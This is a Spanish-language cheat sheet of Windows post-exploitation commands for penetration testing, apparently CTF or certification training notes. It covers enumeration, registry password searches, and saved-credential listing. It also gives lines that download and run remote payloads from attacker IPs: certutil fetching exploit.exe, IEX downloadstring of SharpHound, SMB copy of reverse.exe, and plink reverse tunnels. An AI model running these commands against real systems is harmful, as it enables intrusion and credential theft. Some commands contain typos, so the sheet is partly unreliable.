#windows 
### Enumeración del sistema

```python
	systeminfo
	
	systeminfo | findstr /B /C: "OS Name" /C: "OS Version" /C: "System Type"
	
	wmic qfe get Caption, Description, HotFixID, InstalledOn #Muestra actualizaciones del sistema
	
	wmic logicaldisk get caption, description, providername #Muestra discos
```
### Enumeración de usuarios

```python
whoami

whoami /priv

whoami /groups

net user

net user <USUARIO>

net localgroup

net localgroup <GRUPO>
```
### Enumeración de red

```python
ip a

ifconfig

route

ip route

aipconfig

ipconfig /all #Información extendida

arp -a

route print

netstat -ano
```

### smbclient 

```python
	smbclient \\\\spookysec.local\\backup --user user --password pass
```
### Búsqueda de archivos

```python
#CMD

where /r c:\ file.txt

#Powershell

Get-ChildItem -Path C:\Myfolder -Filter file.txt -Recurs

cmd.exe /c dir /s /b C:\user.txt
```
### Búsqueda de credenciales

```python
#Valores en el registro que contengan la string “password”

reg query HKLM /f password /t REG_SZ /s

#Listar autologon passwords

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

#Lista contraseñas guardadas

cmdkey /list
```
### Enumeración de antivirus

```python
sc query windefend

sc queryex type= service #Lista servicios activos

netsh advfirewall firewall dump
```
### Enumeración con herramientas automáticas

```python
	[Release Release refs/heads/master 20230108 · carlospolop/PEASS-ng (github.com)](https://github.com/carlospolop/PEASS-ng/releases/tag/20230108)
	
	[bitsadmin/wesng: Windows Exploit Suggester - Next Generation (github.com)](https://github.com/bitsadmin/wesng)

````
## Funciones básicas

### Descarga de archivos[](#descarga-de-archivos)

```python
certutil.exe -urlcache -f 10.10.14.4 exploit.exe
```
### Comprobación de permisos sobre un archivo

```python
accesschk.exe /accepteula -quvw <user> <Ruta absoluta del archivo>
```
### Ejecución de un programa como otro usuario en Powershell

```python
powershell -c "$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<USER>', $password);Start-Process -FilePath "<PROGRAM.EXE>" -Credential $creds"
```
### Windows Port Forwarding

```python
plink.exe -l <KALI_USER> -pw <KALI_USER_PASS> -R <KALI_PORT>:<LOCAL_IP/LOCALHOST_IP>:<LOCAL_PORT> <KALI_IP>
```
### Transferencia de archivos mediante smb

```python
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . #Kali

copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe #Windows
```
### Desencriptado GPP

```python
gpp-decrypt "<hash>"
```

### Web Client

```python
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.64/SharpHound.ps1')
```

